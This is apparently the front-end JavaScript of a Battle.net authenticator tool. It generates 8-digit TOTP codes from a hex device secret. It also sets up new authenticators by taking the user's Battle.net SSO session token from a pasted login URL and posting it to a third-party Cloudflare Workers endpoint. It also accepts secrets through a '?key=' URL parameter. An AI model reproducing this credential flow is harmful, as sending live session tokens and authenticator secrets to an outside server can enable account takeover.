/* ── Tab switching ── */
function switchTab(tab) {
    document.querySelectorAll('.tab').forEach(function(t) { t.classList.remove('active'); });
    document.querySelectorAll('.tab-panel').forEach(function(p) { p.classList.remove('active'); });
    document.getElementById('tab-' + tab).classList.add('active');
    document.getElementById('panel-' + tab).classList.add('active');
}

/* ══════════════════════════════
   TAB 1 — GENERATE CODE
══════════════════════════════ */
var secretBytes = null;
var updateInterval = null;
var currentCode = '';

function renderDigits(code) {
    for (var i = 0; i < 8; i++) {
        var el = document.getElementById('d' + i);
        if (code && code.length === 8) {
            el.textContent = code[i];
            el.classList.remove('empty');
            el.classList.add('filled');
        } else {
            el.textContent = '-';
            el.classList.remove('filled');
            el.classList.add('empty');
        }
    }
}

function hexToBytes(hex) {
    hex = hex.replace(/\s/g, '').toLowerCase();
    if (!/^[0-9a-f]+$/.test(hex)) throw new Error('Invalid hex');
    if (hex.length % 2 !== 0) throw new Error('Odd hex length');
    var bytes = [];
    for (var i = 0; i < hex.length; i += 2) {
        bytes.push(parseInt(hex.substr(i, 2), 16));
    }
    return bytes;
}

// Time drift offset in ms (corrected on page load)
var timeDriftMs = 0;

function syncTime() {
    var localBefore = Date.now();
    fetch('https://worldtimeapi.org/api/ip')
    .then(function(res) { return res.json(); })
    .then(function(data) {
        var serverTime = new Date(data.utc_datetime).getTime();
        var localAfter = Date.now();
        var localMid = (localBefore + localAfter) / 2;
        timeDriftMs = serverTime - localMid;
        console.log('Time drift corrected: ' + Math.round(timeDriftMs) + 'ms');
    })
    .catch(function() {
        // If sync fails, just use local time — silent fail
        timeDriftMs = 0;
    });
}

function generateTOTP(secretHex) {
    var now = Date.now() + timeDriftMs;
    var counter = Math.floor(Math.floor(now / 1000) / 30);
    var counterHex = counter.toString(16).padStart(16, '0');
    var key = CryptoJS.enc.Hex.parse(secretHex);
    var msg = CryptoJS.enc.Hex.parse(counterHex);
    var hmac = CryptoJS.HmacSHA1(msg, key);
    var bytes = [];
    var h = hmac.toString(CryptoJS.enc.Hex);
    for (var i = 0; i < h.length; i += 2) {
        bytes.push(parseInt(h.substr(i, 2), 16));
    }
    var offset = bytes[bytes.length - 1] & 0x0f;
    var code = (
        ((bytes[offset]     & 0x7f) << 24) |
        ((bytes[offset + 1] & 0xff) << 16) |
        ((bytes[offset + 2] & 0xff) << 8)  |
         (bytes[offset + 3] & 0xff)
    );
    return (code % 100000000).toString().padStart(8, '0');
}

function updateDisplay() {
    if (!secretBytes) return;
    try {
        var hex = secretBytes.map(function(b) { return b.toString(16).padStart(2, '0'); }).join('');
        currentCode = generateTOTP(hex);
        renderDigits(currentCode);
        var timeLeft = 30 - (Math.floor(Date.now() / 1000) % 30);
        var bar = document.getElementById('progressBar');
        bar.style.width = ((timeLeft / 30) * 100) + '%';
        if (timeLeft <= 5) { bar.classList.add('warning'); } else { bar.classList.remove('warning'); }
        document.getElementById('timeRemaining').textContent = 'Refreshes in ' + timeLeft + 's';
    } catch (e) { console.error(e); }
}

function startGenerator(input) {
    var errorMsg  = document.getElementById('errorMsg');
    var statusMsg = document.getElementById('statusMsg');
    if (!input || input.length < 10 || input.length > 200) {
        errorMsg.classList.remove('active');
        statusMsg.classList.remove('active');
        renderDigits('');
        if (updateInterval) { clearInterval(updateInterval); updateInterval = null; }
        secretBytes = null;
        currentCode = '';
        document.getElementById('progressBar').style.width = '0%';
        document.getElementById('timeRemaining').textContent = 'Refreshes in 30s';
        return;
    }
    try {
        secretBytes = hexToBytes(input);
        errorMsg.classList.remove('active');
        statusMsg.classList.add('active');
        updateDisplay();
        if (updateInterval) clearInterval(updateInterval);
        updateInterval = setInterval(updateDisplay, 1000);
    } catch (e) {
        errorMsg.textContent = 'Invalid private key! Use HEX format.';
        errorMsg.classList.add('active');
        statusMsg.classList.remove('active');
        renderDigits('');
        secretBytes = null;
        currentCode = '';
    }
}

function copyCode() {
    var btn = document.getElementById('copyKeyBtn');
    if (!currentCode) { flashBtn(btn, 'No code yet'); return; }
    writeToClipboard(currentCode, function() { flashBtn(btn, 'Copied!'); });
}

function pasteKey() {
    var btn = document.getElementById('pasteKeyBtn');
    if (navigator.clipboard && navigator.clipboard.readText) {
        navigator.clipboard.readText().then(function(text) {
            document.getElementById('secretInput').value = text;
            startGenerator(text.trim());
            flashBtn(btn, 'Pasted!');
        }).catch(function() {
            document.getElementById('secretInput').focus();
            var orig = btn.textContent;
            btn.textContent = 'Press Ctrl+V';
            setTimeout(function() { btn.textContent = orig; }, 2000);
        });
    } else {
        document.getElementById('secretInput').focus();
        var orig = btn.textContent;
        btn.textContent = 'Press Ctrl+V';
        setTimeout(function() { btn.textContent = orig; }, 2000);
    }
}

document.addEventListener('DOMContentLoaded', function() {
    syncTime();
    var secretInput = document.getElementById('secretInput');
    secretInput.addEventListener('input', function(e) { startGenerator(e.target.value.trim()); });
    secretInput.addEventListener('paste', function(e) { setTimeout(function() { startGenerator(secretInput.value.trim()); }, 100); });

    // Auto-load key from ?key= param (set by 404.html redirect)
    var urlKey = new URLSearchParams(window.location.search).get('key');
    if (urlKey && urlKey.trim().length >= 16) {
        secretInput.value = urlKey.trim();
        startGenerator(urlKey.trim());
    }
});

/* ══════════════════════════════
   TAB 2 — GET NEW KEY
══════════════════════════════ */

function goToStep(n) {
    document.querySelectorAll('.setup-step').forEach(function(s) { s.classList.add('hidden'); });
    document.getElementById('setup-step-' + n).classList.remove('hidden');
    document.querySelectorAll('.step').forEach(function(el, i) {
        el.classList.remove('active', 'done');
        if (i + 1 < n)  el.classList.add('done');
        if (i + 1 === n) el.classList.add('active');
    });
}

function openLogin() {
    window.open('https://account.battle.net/login/en/?ref=localhost', '_blank', 'width=500,height=700');
}

function extractSSOToken(input) {
    input = input.trim();
    try {
        var url = new URL(input);
        var st = url.searchParams.get('ST');
        if (st) return st;
    } catch (e) {}
    if (input.length > 10 && input.indexOf(' ') === -1) return input;
    return null;
}

function processSSO() {
    var raw   = document.getElementById('ssoUrlInput').value.trim();
    var errEl = document.getElementById('ssoError');
    errEl.classList.remove('active');

    var ssoToken = extractSSOToken(raw);
    if (!ssoToken) {
        errEl.textContent = 'Could not find ST= token in that URL. Make sure you copy the full URL from your browser.';
        errEl.classList.add('active');
        return;
    }

    goToStep(3);
    document.getElementById('setup-loading').classList.remove('hidden');
    document.getElementById('setup-result').classList.add('hidden');
    document.getElementById('setup-error').classList.add('hidden');

    fetch('https://small-sunset-f1a2.shasoonali.workers.dev/', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ token: ssoToken })
    })
    .then(function(res) { return res.json(); })
    .then(function(data) {
        if (data.error) {
            throw new Error(data.error);
        }
        document.getElementById('setup-loading').classList.add('hidden');
        document.getElementById('res-serial').textContent  = data.serial      || '—';
        document.getElementById('res-restore').textContent = data.restoreCode  || '—';
        document.getElementById('res-secret').textContent  = data.deviceSecret || '—';
        document.getElementById('setup-result').classList.remove('hidden');
        document.querySelectorAll('.step').forEach(function(el) { el.classList.remove('active'); el.classList.add('done'); });
    })
    .catch(function(e) {
        document.getElementById('setup-loading').classList.add('hidden');
        document.getElementById('setup-error-msg').textContent = e.message || 'Unknown error occurred.';
        document.getElementById('setup-error').classList.remove('hidden');
    });
}

function useThisKey() {
    var secret = document.getElementById('res-secret').textContent.trim();
    if (!secret || secret === '—') return;
    document.getElementById('secretInput').value = secret;
    startGenerator(secret);
    switchTab('generate');
}

function downloadTxt() {
    var serial  = document.getElementById('res-serial').textContent.trim();
    var restore = document.getElementById('res-restore').textContent.trim();
    var secret  = document.getElementById('res-secret').textContent.trim();
    var filename = 'battlenet_backup_' + serial.replace(/-/g, '_') + '.txt';
    var sep = '======================================================================';
    var lines = [
        sep,
        'Battle.net Authenticator Backup',
        sep,
        '',
        'WARNING: KEEP THIS FILE SECURE! DO NOT SHARE!',
        '',
        'Serial Number:          ' + serial,
        'Restore Code:           ' + restore,
        'Device Secret (HEX):    ' + secret,
        '',
        sep,
        'Generated by Battle.net Authenticator Tool',
        sep
    ].join('\n');
    var blob = new Blob([lines], { type: 'text/plain' });
    var url  = URL.createObjectURL(blob);
    var a    = document.createElement('a');
    a.href     = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
}

function resetSetup() {
    document.getElementById('ssoUrlInput').value = '';
    document.getElementById('ssoError').classList.remove('active');
    goToStep(1);
}

function copyField(id) {
    var text = document.getElementById(id).textContent.trim();
    var btn  = event.currentTarget;
    writeToClipboard(text, function() {
        var orig = btn.textContent;
        btn.textContent = 'OK';
        setTimeout(function() { btn.textContent = orig; }, 1500);
    });
}

/* ── Shared helpers ── */
function writeToClipboard(text, cb) {
    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(text).then(cb).catch(function() { fallbackCopy(text, cb); });
    } else {
        fallbackCopy(text, cb);
    }
}

function fallbackCopy(text, cb) {
    var ta = document.createElement('textarea');
    ta.value = text;
    ta.style.position = 'fixed';
    ta.style.left = '-9999px';
    document.body.appendChild(ta);
    ta.select();
    try { document.execCommand('copy'); if (cb) cb(); } catch (e) {}
    document.body.removeChild(ta);
}

function flashBtn(btn, msg) {
    var orig = btn.textContent;
    var origClass = btn.className;
    btn.textContent = msg;
    btn.classList.add('flash');
    setTimeout(function() { btn.textContent = orig; btn.className = origClass; }, 2000);
}
